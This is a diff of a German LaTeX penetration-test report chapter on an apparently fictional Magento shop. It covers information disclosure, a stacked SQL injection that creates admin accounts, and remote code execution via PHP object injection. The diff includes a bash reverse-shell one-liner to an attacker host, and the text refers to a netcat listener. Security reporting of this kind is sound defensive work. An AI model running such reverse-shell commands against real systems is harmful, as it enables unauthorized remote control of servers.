@@ -1,33 +1,35 @@
 \chapter{Tobold's Pfeifenkraut-Shop}
 
+\vfill
 \begin{figure}[!ht]
     \centering
     \includegraphics[width=\linewidth]{images/screenshots/09_pfeifenkraut_shop.png}
     \caption{Webanwendung Tobold's Pfeifenkrautshop}
     \label{fig:07_pfeifenkraut_shop}
 \end{figure}
+\vfill
 \newpage
 
 
 \cvss{av=local, ac=high, pr=high, ui=required, s=unchanged, c=low, i=low, a=low}
-\cvssdescription{Etiam risus sapien, ornare at dui ut, semper eleifend arcu. In fermentum felis ut ornare convallis. Donec ultrices condimentum neque ut semper.}
+\cvssdescription{Informationspreisgabe über das verwendete CMS System und aktiviertes Directory Listing.}
 
-\section{\makecvssbadge Tobold's Pfeifenkraut-Shop: Informationspreisgabe}
-\cvssaddtosummary{Tobold's Pfeifenkraut-Shop: Informationspreisgabe}
+\section{\makecvssbadge Information Disclosure}
+\cvssaddtosummary{Tobold's Pfeifenkraut-Shop: Information Disclosure}
 
 \subsection*{Proof of concept}
 Über den Header der Webanwendung ist ersichtlich, dass es sich bei der Webanwendung um eine Magento Anwendung handelt. Durch das aktivierte Directory Listing kann außerdem abgeschätzt werden, wann das Projekt erstellt wurde und um welche Magento-Version es sich handelt.
 
 \subsection*{Empfehlungen}
 \begin{itemize}
-    \item Informationen über die verwendeten Technologien von der Webanwendung entfernen, Beispielsweise das Magento-Logo im Header entfernen
-    \item Das Directory-Listing deaktivieren und nur die nötigen Dateien erreichbar machen.
+    \item Informationen über die verwendeten Technologien von der Webanwendung entfernen, Beispielsweise das Magento-Logo im Header entfernen (siehe \cite{owaspSecurityMisconfiguration}).
+    \item Das Directory-Listing deaktivieren und nur die nötigen Dateien erreichbar machen (siehe \cite{owaspSecurityMisconfiguration}).
 \end{itemize}
 
 \cvss{av=local, ac=low, pr=none, ui=required, s=changed, c=high, i=low, a=low}
-\cvssdescription{Etiam risus sapien, ornare at dui ut, semper eleifend arcu. In fermentum felis ut ornare convallis. Donec ultrices condimentum neque ut semper.}
+\cvssdescription{Stacked SQL Injection zur Erstellung von Administrator-Accounts, mit Hilfe einer bekannten Sicherheitslücke.}
 
-\section{\makecvssbadge Tobold's Pfeifenkraut-Shop: SQL Injection}
+\section{\makecvssbadge SQL Injection}
 \cvssaddtosummary{Tobold's Pfeifenkraut-Shop: SQL Injection}
 
 \subsection*{Proof of concept}
@@ -36,25 +38,24 @@ Durch die gewonnen Informationen über das verwendete CMS und die ungefähre Ver
 
 \subsection*{Empfehlungen}
 \begin{itemize}
-    \item Aktualisieren der Magento-Installation, welche den Patch für diese Schwachstelle beinhaltet.
-    \item Regelmäßige Updates sind außerdem hilfreich um zukünftig ähnliche Sicherheitsprobleme zu umgehen, da dadurch Sicherheitsupdates regelmäßig durchgeführt werden.
-    \item Eingabevalidierung der Benutzereingaben kann ebenfalls Injection-Angriffe wie diese verhindern.
-    \item Im Speziellen für SQL-Injections ist das Verwenden von Paramterized-Queries sinnvoll, da dadurch solche Stacked-SQL-Injection Angriffe verhindert werden können.
+    \item Aktualisieren der Magento-Installation, welche den Patch für diese Schwachstelle beinhaltet (siehe \cite{owaspVulnerableDependency}).
+    \item Regelmäßige Updates sind außerdem hilfreich um zukünftig ähnliche Sicherheitsprobleme zu umgehen, da dadurch Sicherheitsupdates regelmäßig durchgeführt werden (siehe \cite{owaspVulnerableDependency}).
+    \item Eingabevalidierung der Benutzereingaben kann ebenfalls Injection-Angriffe wie diese verhindern (Siehe \cite{owaspInputValidation}).
+    \item Im Speziellen für SQL-Injections ist das Verwenden von Paramterized-Queries sinnvoll, da dadurch solche Stacked-SQL-Injection Angriffe verhindert werden können  (Siehe \cite{owaspSQLInjectionPrevention}).
 \end{itemize}
 
 \cvss{av=network, ac=low, pr=none, ui=required, s=changed, c=high, i=high, a=high}
-\cvssdescription{Etiam risus sapien, ornare at dui ut, semper eleifend arcu. In fermentum felis ut ornare convallis. Donec ultrices condimentum neque ut semper.}
+\cvssdescription{Authenticated Remote Code Execution über einen bekannten Exploit des Magento CMS.}
 
-\section{\makecvssbadge Tobold's Pfeifenkraut-Shop: Authenticated Remote Code Execution}
-\cvssaddtosummary{Tobold's Pfeifenkraut-Shop: Authenticated Remote Code Execution}
+\section{\makecvssbadge Remote Code Execution (RCE)}
+\cvssaddtosummary{Tobold's Pfeifenkraut-Shop: Remote Code Execution (RCE)}
 
 \subsection*{Proof of concept}
-Mittels eine weitere bekannten Schwachstelle für Magento-Installationen unterhalb der Version 1.9 können Systembefehle auf dem Webserver ausgeführt werden. Um diese Schwachstelle ausnutzen zu können müssen Anmeldedaten für einen Nutzer mit Administratorzugriff vorliegen. Die Erstellung eines solchen Accounts wurde im vorherigen Kapitel erläutert. Damit der Exploit funktioniert muss zunächst eine Bestellung aufgegeben werden und diese durch einene Admin bestätigt werden. Anschließend kann das Python-Skript, welches die Schwachstelle ausnutzt verwendet werden. Das angepasste Python-Skript befindet sich in \autoref{listing:appendix:pfeifenkrautshop_RCE}.  Die Schwachstelle nutzt eine unsicheres PHP-Skript aus. Dieses Skript behandelt PHP-Objekte unsicher, sodass eine PHP Object Injection möglich ist. Dafür wird eine POP Chain übergeben, welche bei der Deserialisierung der Objekte einen übergebenen System-Befehl ausführt. Wird dieser System-Befehl
-so gewählt wie in \autoref{listing:bash-reverse-shell} kann eine Reverse Shell initiiert werden. Der passende Netcat-Listener, der auf dem Angreifersystem ausgeführt wird, für diese Reverse Shell ist in \autoref{listing:netcat-listener} dargestellt.
+Über eine weitere bekannte Schwachstelle für Magento-Installationen unterhalb der Version 1.9 können Systembefehle auf dem Webserver ausgeführt werden. Um diese Schwachstelle ausnutzen zu können, müssen Anmeldedaten für einen Benutzer mit Administratorzugriff vorhanden sein. Die Erstellung eines solchen Accounts wurde im vorherigen Kapitel beschrieben. Damit der Exploit funktioniert, muss zunächst eine Bestellung aufgegeben und von einem Administrator bestätigt werden. Danach kann das Python-Skript ausgeführt werden, das die Schwachstelle ausnutzt. Das angepasste Python-Skript befindet sich in \autoref{listing:appendix:pfeifenkrautshop_RCE}.  Die Schwachstelle wird durch ein unsicheres PHP-Skript ausgenutzt. Dieses Skript behandelt PHP-Objekte unsicher, so dass eine PHP Object Injection möglich ist. Dazu wird eine POP-Kette übergeben, die bei der Deserialisierung der Objekte ein übergebenes Systemkommando ausführt. Wird dieses Systemkommando wie in \autoref{listing:bash-reverse-shell} ausgewählt, kann eine Reverse Shell gestartet werden. Der entsprechende Netcat-Listener, der auf dem Angreifersystem für diese Reverse Shell ausgeführt wird, ist in \autoref{listing:netcat-listener} dargestellt. Ein Nachweis ist in \autoref{fig:07_pfeifenkraut_shop_proof} dargestellt. 
 
 \begin{listing}[!ht]
 \begin{minted}{bash}
-bash -c 'bash -i >& /dev/tcp/10.0.32.5/9001 0>&1
+bash -c 'bash -i >& /dev/tcp/<Angreifer-IP>/9001 0>&1
 \end{minted}
 \caption{Bash Reverse Shell}
 \label{listing:bash-reverse-shell}
@@ -69,6 +70,6 @@ bash -c 'bash -i >& /dev/tcp/10.0.32.5/9001 0>&1
 
 \subsection*{Empfehlungen}
 \begin{itemize}
-    \item Updaten der Magento-Version. In den aktuellen Versionen ist die Sicherheitslücke geschlossen.
+    \item Updaten der Magento-Version. In den aktuellen Versionen ist die Sicherheitslücke geschlossen (siehe \cite{owaspVulnerableDependency}).
     
 \end{itemize}
